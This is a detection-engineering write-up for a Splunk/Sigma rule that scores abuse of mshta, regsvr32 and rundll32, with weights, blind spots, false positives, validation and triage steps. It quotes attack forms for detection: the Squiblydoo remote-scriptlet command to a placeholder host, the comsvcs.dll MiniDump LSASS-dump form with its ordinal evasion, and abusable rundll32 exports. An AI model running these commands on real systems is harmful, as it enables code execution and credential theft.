# System Binary Proxy Execution — Rundll32, Mshta and Regsvr32

> **Technique**: T1218.005 (Mshta) · T1218.010 (Regsvr32) · T1218.011 (Rundll32)
> **Tactic**: Defence Evasion (TA0005)
> **Severity**: Tiered — Medium / High / Critical (weighted score)
> **Status**: Experimental

---

## Goal

Detect three signed Microsoft binaries — `mshta.exe`, `regsvr32.exe` and `rundll32.exe` — being used to proxy the execution of attacker code. All three ship with Windows, all three are trusted by application allow-lists, and all three are network-and-proxy aware, which is the whole reason adversaries reach for them. Running a payload *through* one of these means the process that shows up in telemetry is a legitimate Microsoft-signed executable, not the attacker's binary.

The rule scores each proxy-binary process across command-line, parent-process and network signals, and grades the result rather than firing on a flat match. Grading matters more here than on most techniques: `rundll32.exe` alone runs thousands of times a day on a normal estate, so a binary "did rundll32 run" rule is worthless. What is worth alerting on is *how* it ran, and whether it then called out.

The scope is the proxy binary **as the process**. A proxy binary that spawns a shell (`mshta → powershell`) is deliberately handed off to the T1059.001 rule — see Blind Spots.

---

## Known Real-World Usage

These three are near-permanent fixtures in intrusion reporting, because the abuse costs an adversary nothing to set up.

- **Squiblydoo** (`regsvr32 /s /n /u /i:http://host/payload.sct scrobj.dll`) — published by Casey Smith in 2016 and never really went away. It fetches a remote scriptlet and executes it without writing the payload to disk or leaving a registration behind, which sidesteps AppLocker default rules and a lot of file-based detection at the same time. Used by Cobalt Group and APT32 among others ([ATT&CK T1218.010](https://attack.mitre.org/techniques/T1218/010/)).
- **Qakbot** — runs its core DLL through `regsvr32` and `rundll32` as a matter of routine. It is a good illustration of why the rundll32 baseline is such a problem: structurally, the malicious invocation looks like the legitimate one.
- **HTA phishing delivery** — `mshta` executing an `.hta` from a URL, or an inline `vbscript:` / `javascript:` string, is a long-running phishing pattern (MuddyWater's POWERSTATS delivery being the well-documented case). It resurfaced hard in the 2024–25 **ClickFix / FakeCaptcha** campaigns, where the victim is socially engineered into pasting the `mshta` one-liner into the Run box themselves. That family turned up during this rule's own testing, as a Defender ML detection on the *generator script* — see [validation.md](validation.md).
- **`rundll32 comsvcs.dll, MiniDump`** — dumps LSASS using nothing but a signed in-box DLL. Credential access rather than pure evasion, but it arrives through this rule's data source, it is unambiguous, and so it is scored as a smoking gun here rather than deferred to a separate rule.

---

## Categorisation

| Field | Value |
|---|---|
| ATT&CK Tactic | Defence Evasion (TA0005) |
| ATT&CK Technique | System Binary Proxy Execution — Mshta (T1218.005), Regsvr32 (T1218.010), Rundll32 (T1218.011) |
| Data Source | Sysmon EID 1 (process creation) + Sysmon EID 3 (network connection) |
| Log Category | `process_creation` (Sigma base) · `network_connection` (correlated in the SPL) |
| Platform | Windows |
| SIEM | Splunk (SPL) · Sigma base (`rule.yml`) |

---

## Strategy Abstract

Two events, one row. The rule pulls EID 1 and EID 3 from the Sysmon channel, filtered to the three images, then folds them together by `ProcessGuid` with `stats max()`. EID 1 carries the command line and the parent, so every content signal scores there. EID 3 carries nothing useful for scoring, but it tells us the process opened a socket — which is the single most valuable piece of context available for these binaries, since none of the three has routine business making outbound connections in most environments. Using `max()` over the group means a signal that fired on the process-creation event survives the collapse, and a bare EID 3 rows scores zero on its own.

Signals sit in three weight bands:

**Smoking guns (4)** — `cred_dump` (the comsvcs MiniDump export, named or by ordinal `#+24`) and `squiblydoo_remote` (a `/i:` pointing at http or ftp). Both are High on their own. Legitimate DLL registration never references a URL, and nothing benign calls the MiniDump export by hand. Credential dumping is deliberately network-independent, so it does not wait on an EID 3.

**Strong (2)** — `rundll_script_abuse`, `mshta_cli`, `mshta_clsid`, `mshta_parent`, `squiblydoo_local`, `regsvr_parent`. Each is real signal, but each also has a plausible benign story, so one alone grades Medium.

**Weak (1)** — `rundll_parent` and `path_obfuscation`. Neither can fire alone under the default floor. Together they make 2, which is what mirrors the `susp_rundll32_parent and susp_rundll32_path_obfuscation` branch in the Sigma base.

**Network (+3)** — added once, and only when a process-creation signal has already scored. That gate is the important part. Without it, every rundll32 that happened to open a socket would fire, and on a real estate that is a great many of them.

Each signal is scoped to its own binary (`proc=="mshta"` and so on), so a token that appears in more than one signal list — `javascript:` is in both the rundll32 and mshta lists — is only counted once.

The Sigma base (`rule.yml`) expresses the same selections as a flat boolean condition, because Sigma cannot score. The weighting, the network correlation and the analyst-facing `DetectionReason` all live in the SPL.

---

## Technical Context

### Attack Mechanics

| Binary | Abuse | Detection note |
|---|---|---|
| `mshta.exe` | Executes `.hta` files, inline `vbscript:` / `javascript:` straight off the command line, or a bare COM CLSID | The payload is usually visible in the command line itself — the easiest of the three to read |
| `mshta.exe` | Fetches and runs an `.hta` directly from a URL | Command line carries `http://` / `https://`, and normally an EID 3 follows |
| `regsvr32.exe` | Squiblydoo — loads a remote `.sct` scriptlet via `scrobj.dll` | `/i:http` or `/i:ftp` is close to zero-FP; the local `.sct` variant is strong but not conclusive |
| `rundll32.exe` | Calls dangerous in-box exports (`shell32,ShellExec_RunDLL`, `advpack,LaunchINFSection`, `url.dll,OpenURL`, …) | Export-name matching. Some of these are also used legitimately by installers |
| `rundll32.exe` | `comsvcs.dll, MiniDump <pid>` against LSASS | The documented form has a space after the comma, and `#+24` evades a plain `#24` match — hence a regex rather than a `contains` |
| `rundll32.exe` | Loads a DLL by ordinal (`,#1`) or out of a user-writable path | Weak on its own; enormous legitimate baseline |
| Any of the three | Renamed on disk to look like something else | Caught on EID 1 via `OriginalFileName`, but see Blind Spots for the EID 3 gap |

### Telemetry

**Sysmon EID 1 (process creation)** — the primary surface:

| Field | Use |
|---|---|
| `Image` | Which proxy binary this is |
| `OriginalFileName` | PE-header name, survives renaming — the fallback for classifying `proc` |
| `CommandLine` | Where almost every content signal is evaluated |
| `ParentImage` | The parent signals (Office app, browser, script host, another proxy binary) |
| `ProcessGuid` | The join key that folds EID 1 and EID 3 into one row |
| `User`, `Computer` | Triage context |

**Sysmon EID 3 (network connection)** — one field's worth of signal (did this process connect at all) plus `DestinationIp` / `DestinationPort` / `DestinationHostname` for triage. EID 3 rows have no `CommandLine` or `ParentImage`, which is why they score zero and depend on `max()` to inherit the EID 1 signals.

Useful during triage but not read by the rule: EID 7 (ImageLoad) shows the module actually loaded, which closes the gap where a command line looks clean or uses an ordinal; EID 11 (FileCreate) shows a payload being staged before execution.

### Detection Logic

| Signal | Weight | Rationale |
|---|---|---|
| `cred_dump` | 4 | `comsvcs.dll, MiniDump` / `#+24`. No benign explanation |
| `squiblydoo_remote` | 4 | `/i:http` or `/i:ftp` — legitimate COM registration never points at a URL |
| `rundll_script_abuse` | 2 | Script-engine and proxy exports; a few are used by real installers |
| `mshta_cli` | 2 | Inline script, remote URL, ` -enc` or `FromBase64String` on the command line |
| `mshta_clsid` | 2 | A bare `{GUID}` in place of a file path |
| `mshta_parent` | 2 | Office app or browser spawning mshta — the phishing shape |
| `squiblydoo_local` | 2 | `scrobj.dll` / `.sct` with no URL. Suppressed when `squiblydoo_remote` already fired, so one command line is not counted twice |
| `regsvr_parent` | 2 | Script host, Office app, browser or another proxy binary as the parent |
| `rundll_parent` | 1 | Shells are extremely common legitimate parents |
| `path_obfuscation` | 1 | Ordinal loading / user-writable paths. Installers do this constantly |
| network connection | +3 | Added only when `SignalScore >= 1` |

| Tier | Score | Meaning |
|---|---|---|
| **Critical** | ≥ 5 | A smoking gun plus anything else, or any scoring process that also called out to the network |
| **High** | 4 | A smoking gun on its own, or two strong signals stacked |
| **Medium** | 2–3 | One strong signal, or the `rundll_parent + path_obfuscation` pair |
| Informational | 1 | A lone weak signal. Sits **below** the default firing floor (`where Score >= 2`), so it is only visible if the floor is dropped to `>= 1` |

One consequence of the +3 is worth being explicit about: a single strong signal plus a network connection scores 5 and lands on Critical, skipping High entirely. That is intentional — mshta fetching something over the network is the attack, not a hypothetical — but it is the first knob I would turn if the Critical queue got noisy. Dropping the network bonus to +2 makes that combination High instead.

---

## Blind Spots & Assumptions

**Assumptions:**

- Sysmon is installed, running, and configured to log **both** EID 1 and EID 3, with nothing filtering out rundll32/mshta/regsvr32 or their common parents. A config that drops EID 3 for signed binaries silently removes the network half of this rule.
- Sysmon is untampered. Anyone who unloads the driver defeats the rule outright; a companion check on Sysmon service state belongs alongside this one.
- Splunk's `Splunk_TA_windows` is extracting `Image` / `ParentImage` / `CommandLine` / `OriginalFileName` / `ProcessGuid` / `User` / `Destination*` from the Sysmon channel.

**Blind Spots:**

- **The jump-process problem.** If rundll32 or mshta is only used to launch something else — it spawns `powershell.exe`, and *that* process does the download — this rule sees the proxy binary and nothing more. The network connection belongs to the child, so no EID 3 lands on this `ProcessGuid` either, and both halves of the detection miss at once. This is the biggest gap, and it is by design: chasing the child chain here would duplicate the T1059.001 rule, which already correlates parents and grandparents. The consequence is that **T1059.001 has to treat rundll32/mshta/regsvr32 as suspicious parents** — otherwise the handoff falls down the gap between the two rules.
- **Renamed binaries and EID 3.** `OriginalFileName` catches a renamed proxy binary on the process-creation event, but the initial search filters EID 3 on `Image`, so the renamed binary's network connection is never pulled into the group. It still scores on its EID 1 signals, it just loses the +3. Narrow enough to document rather than fix.
- **Command-line obfuscation.** Every content signal is a string or regex match. Case is handled (`(?i)`), but character insertion, environment-variable indirection and quoted fragmentation all defeat them. Nothing in this rule normalises the command line first.
- **Remote-triggered execution.** WMI, PsExec and WinRM chains are not covered — the parent signals assume a local, interactive-looking process tree.
- **Staged payloads.** Treating "no network connection" as lower severity assumes live, single-stage execution. A payload already sitting on disk never opens a socket, and tops out at Medium or High.
- **The rest of T1218.** Three sub-techniques are in scope. `msiexec`, `cmstp`, `installutil`, `odbcconf` and the other proxy binaries are not.

---

## False Positives

- **rundll32 is the worst offender by a distance.** Control Panel routing (`shell32.dll,Control_RunDLL`) is the most common legitimate invocation on Windows, printer and device management use it constantly, and installers run INF sections through `advpack.dll,LaunchINFSection` and `setupapi.dll,InstallHinfSection` — both of which sit in the `rundll_script_abuse` list at weight 2. That is a deliberate trade. Those exports are genuinely abused, so they score, and the tuning answer is an allow-list on the specific installer command lines rather than pulling the export out of the list. The weak signals exist precisely so the everyday shell-spawns-rundll32 case cannot fire on its own.
- **regsvr32** — routine COM/DLL registration during software install and uninstall, particularly older ActiveX-era applications, Java, and legacy Office components. Watch for SCCM/Intune deployment bursts, which light up many hosts inside the same few minutes.
- **mshta** — a much smaller baseline than the other two, but legacy internal HTA admin tooling and older line-of-business installers do still exist. If an environment has one it will appear every day with the same command line, which makes it easy to allow-list.
- **Updaters** loading vendor DLLs staged in `%TEMP%` or `%APPDATA%` trip `path_obfuscation`, which on its own is not enough to fire.

Both tuning knobs are single lines in the SPL: the firing floor (`where Score >= 2`) and the network bonus (`+3`).

---

## Priority / Severity

Tiered rather than fixed. The three binaries have wildly different benign baselines — mshta is rare, regsvr32 is periodic, rundll32 is constant — so one severity across all of them would be either too loud for rundll32 or too quiet for mshta.

Critical is reserved for combinations with essentially no benign explanation: a remote scriptlet fetch, an LSASS dump export, or any scoring process that also opened a network connection. High covers the smoking guns in isolation and two stacked strong signals. Medium is the single-strong-signal case, which is where most real detections will land and where an analyst is expected to make an actual judgement call. Nothing fires on a weak signal alone, and that decision is what makes the rule survivable next to the rundll32 baseline.

---

## Validation

See [validation.md](validation.md) for the full record.

**Round 1 — manual trigger validation** (2026-07-09 to 07-10): each selection driven interactively on the lab host and cross-referenced against Sysmon EID 1 in Splunk by `ProcessGuid`. Confirmed the `cmd → rundll32 (url.dll,OpenURL) → msedge` chain end to end, and the mshta child-spawn behaviour from a saved `.hta`. Most of this round went on a false trail: repeated "nothing executes" results turned out to be smart-quote substitution when pasting nested-quote command lines, plus Notepad adding a BOM to `.vbs` files (VBScript error 800A0408) — not AV, ASR or AppLocker blocking, which is what I assumed first.

**Round 2 — Chainsaw fixture batch** (Sigma rule): nine malicious and nine benign EID 1 slices generated by [telemetry-generator_mal.ps1](telemetry-generator_mal.ps1) and [telemetry-generator-benign.ps1](telemetry-generator-benign.ps1), hunted through the repo's pytest harness. **18/18 passed on the first run** — every malicious fixture fired, every benign one stayed quiet, no tuning iterations. The effort in this round went into building fixtures Defender would tolerate, not into tuning the rule: every trigger had to be rewritten as an *inert* command line that carries the signal without executing a working attack.

**Round 3 — SPL** (2026-07-19): the same fixture set replayed against `rule.spl` in Splunk. The benign FP rate held at zero, but most malicious cases graded only Informational under the original tier cuts, because a single-strong-signal command line scores exactly 2. Medium was lowered to `Score >= 2` in response, which promoted those cases without touching the benign side — the benign fixtures all score 0, so no threshold change can reach them.

Atomic Red Team was not run for this technique. The ART T1218 tests are hard-blocked by the EDR on this host at process creation, so they produce no telemetry to test against, and the equivalent coverage came from the inert fixture set instead. One of those blocks is a finding in its own right: `regsvr32 /i:http…scrobj.dll` never spawns at all with real-time protection on, which is why the remote-Squiblydoo fixture uses `/i:ftp`.

---

## Response

1. **Read `Signals` and `DetectionReason` first.** The rule emits every signal that scored, so "what actually fired" is answered before you open anything else. Check `has_network` in the same glance.
2. **Read the command line.** For these three binaries the payload is usually sitting right there. Decode any base64 blob:
   `powershell -c "[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('<blob>'))"`
3. **If `has_network=1`, triage the destination.** `DestinationIp` / `DestinationHostname` / `DestinationPort` are all in the alert. No IP or domain allow-list is baked into the rule, since that would not be portable — scope it against your own infrastructure.
4. **Walk the process tree by GUID.** `ParentProcessGuid` upward answers who launched the proxy binary, and an Office app or browser parent is a very different story to an installer. Then look *downward* for children, because that is where this rule stops and T1059.001 starts.
5. **On a rundll32 hit, check what was actually loaded.** Sysmon EID 7 (ImageLoad) for the same `ProcessGuid` shows the real module, which matters when the command line looks clean or calls an export by ordinal.
6. **Hunt the same command line across the estate.** Squiblydoo URLs and HTA lures are rarely sent to one person, so the same `CommandLine` on a second host changes the scope of the incident immediately.
7. **Decide.** Malicious: isolate the host, preserve the command line and any referenced `.sct` / `.hta` / DLL, then begin DFIR. Benign: add `User` + `CommandLine` to the tuning allow-list rather than weakening the signal.

---

## References

- [MITRE ATT&CK — T1218 System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218/)
- [MITRE ATT&CK — T1218.005 Mshta](https://attack.mitre.org/techniques/T1218/005/)
- [MITRE ATT&CK — T1218.010 Regsvr32](https://attack.mitre.org/techniques/T1218/010/)
- [MITRE ATT&CK — T1218.011 Rundll32](https://attack.mitre.org/techniques/T1218/011/)
- [LOLBAS — Regsvr32](https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/)
- [LOLBAS — Rundll32](https://lolbas-project.github.io/lolbas/Binaries/Rundll32/)
- [LOLBAS — Mshta](https://lolbas-project.github.io/lolbas/Binaries/Mshta/)
- [Atomic Red Team — T1218](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md)
- [Sysmon — event schema (EID 1 / 3 / 7)](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
- [Palantir ADS Framework](https://github.com/palantir/alerting-detection-strategy-framework)
